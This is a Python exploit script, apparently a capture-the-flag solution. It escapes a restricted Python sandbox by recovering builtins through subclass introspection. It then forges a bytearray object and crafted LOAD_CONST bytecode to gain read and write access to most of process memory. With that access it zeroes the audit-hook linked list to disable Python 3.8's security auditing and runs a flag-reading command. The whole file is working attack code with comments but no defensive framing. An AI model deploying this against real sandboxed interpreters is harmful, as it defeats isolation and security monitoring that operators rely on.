def lookup_class(class_name):
    return [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == class_name][0]


# Recover builtins
builtins = lookup_class('ModuleSpec').__init__.__globals__['__builtins__']
globals = builtins['globals']
globals().update(builtins)

# The following bytecode exploit payload is from https://www.da.vidbuchanan.co.uk/blog/35c3ctf-collection-writeup.html

# from dis.opmap
OP_LOAD_CONST = 100
OP_EXTENDED_ARG = 144
OP_RETURN_VALUE = 83


# packing utilities
def p8(x):
    return bytes([x & 0xff])


def p64(x):
    return bytes([(x >> i) & 0xff for i in range(0, 64, 8)])


const_tuple = ()

# construct the fake bytearray
fake_bytearray = bytearray(
    p64(0x41414141) +          # ob_refcnt
    p64(id(bytearray)) +       # ob_type
    p64(0x7fffffffffffffff) +  # ob_size (INT64_MAX)
    p64(0) +                   # ob_alloc (doesn't seem to really be used?)
    p64(0) +                   # *ob_bytes (start at address 0)
    p64(0) +                   # *ob_start (ditto)
    p64(0)                     # ob_exports (not really sure what this does)
)

fake_bytearray_ptr_addr = id(fake_bytearray) + 0x20
const_tuple_array_start = id(const_tuple) + 0x18
offset = (fake_bytearray_ptr_addr - const_tuple_array_start) // 8

# construct the bytecode
bytecode = b''
for i in range(24, 0, -8):
    bytecode += p8(OP_EXTENDED_ARG) + p8(offset >> i)
bytecode += p8(OP_LOAD_CONST) + p8(offset)
bytecode += p8(OP_RETURN_VALUE)


def foo():
    pass


foo.__code__ = foo.__code__.__class__(
    0, 0, 0, 0, 0, 0,  # Python 3.8 has one new argument: posonlyargcount
    bytecode, const_tuple,
    (), (), '', '', 0, b''
)
magic = foo()  # magic is now a window into most of the address space!

# print(magic[0x400000:0x400000+4])  # read the elf header as a sanity check (this may not work if Python is PIE)

# Now we monkeypatch the audit hook linked list to remove the installed hook.

# Locate the head of the global hook linked list. Handle PIE by using relative address.
# We can get this offset by reverse engineering the `libpython3.8.so.1.0` file.
# It may or may not be deterministic for Python 3.8.3 docker, but you can always leak this binary using this bug.
hook_offset = 0x54410
hook_addr = id(bytearray) + hook_offset
# print(magic[hook_addr:hook_addr+8])  # Check original hook address
magic[hook_addr:hook_addr+8] = p64(0)  # Overwrite with 0 to clear the audit hook
__import__('os').system('/readflag')  # Get shell!
